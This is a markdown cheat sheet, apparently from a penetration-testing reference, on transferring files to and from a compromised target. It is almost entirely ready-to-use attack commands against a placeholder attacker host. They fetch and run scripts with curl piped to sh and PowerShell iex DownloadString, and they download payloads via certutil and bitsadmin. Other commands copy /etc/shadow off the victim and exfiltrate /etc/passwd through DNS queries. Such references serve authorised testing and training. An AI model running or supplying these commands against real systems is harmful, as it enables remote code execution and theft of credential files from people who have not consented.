---
title: File Transfer To/From Target
category: reverse-shells
description: HTTP, SMB, FTP, scp, certutil, base64.
tags: [transfer, http, smb]
os: [any]
order: 30
---

## Quick HTTP server (attacker)

```bash
python3 -m http.server 8000
# or
ruby -run -e httpd . -p 8000
# write-enabled (uploads land in cwd)
twistd -n web --path=. --listen=tcp:8000
# Or Updog (handles uploads)
updog -p 8000
```

## Linux victim pulls

```bash
wget http://{{LHOST}}:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://{{LHOST}}:8000/linpeas.sh -o /tmp/linpeas.sh
curl -s http://{{LHOST}}:8000/linpeas.sh | sh
exec 3<>/dev/tcp/{{LHOST}}/8000; echo -e 'GET /file HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/file
```

## Windows victim pulls

```powershell
(New-Object Net.WebClient).DownloadFile("http://{{LHOST}}:8000/x.exe","C:\Temp\x.exe")
iwr http://{{LHOST}}:8000/x.exe -OutFile C:\Temp\x.exe
iex (iwr http://{{LHOST}}:8000/x.ps1 -UseBasicParsing).Content
```

```cmd
certutil -urlcache -split -f http://{{LHOST}}:8000/x.exe C:\Temp\x.exe
bitsadmin /transfer j /priority normal http://{{LHOST}}:8000/x.exe C:\Temp\x.exe
curl http://{{LHOST}}:8000/x.exe -o C:\Temp\x.exe   :: Win10+
```

## SMB server (attacker)

```bash
impacket-smbserver share . -smb2support
# Optionally with auth:
impacket-smbserver -username {{USER}} -password 'pass' share . -smb2support
```

```cmd
copy \\{{LHOST}}\share\x.exe C:\Temp\
xcopy \\{{LHOST}}\share\dir C:\Temp\ /E
```

```powershell
net use Z: \\{{LHOST}}\share
```

## Pull a remote PS script (executes in memory)

```powershell
iex (New-Object Net.WebClient).DownloadString('http://{{LHOST}}:8000/PowerView.ps1')
```

## Tiny encode/decode (no tools)

```bash
# Encode on attacker
base64 -w0 file
# Decode on victim
echo 'BASE64...' | base64 -d > file
```

```powershell
[IO.File]::WriteAllBytes("C:\Temp\x.exe",[Convert]::FromBase64String("BASE64..."))
```

## SCP / SFTP (if SSH)

```bash
scp linpeas.sh {{USER}}@{{RHOST}}:/tmp/
scp {{USER}}@{{RHOST}}:/etc/shadow .
```

## DNS exfil (slow but firewalled-safe)

```bash
# Attacker (control DNS server domain)
sudo tcpdump -lni any 'udp port 53'

# Victim
for c in $(xxd -p /etc/passwd | tr -d '\n' | fold -w 60); do
  dig "$c.exfil.{{LHOST}}" @{{LHOST}} +short
done
```
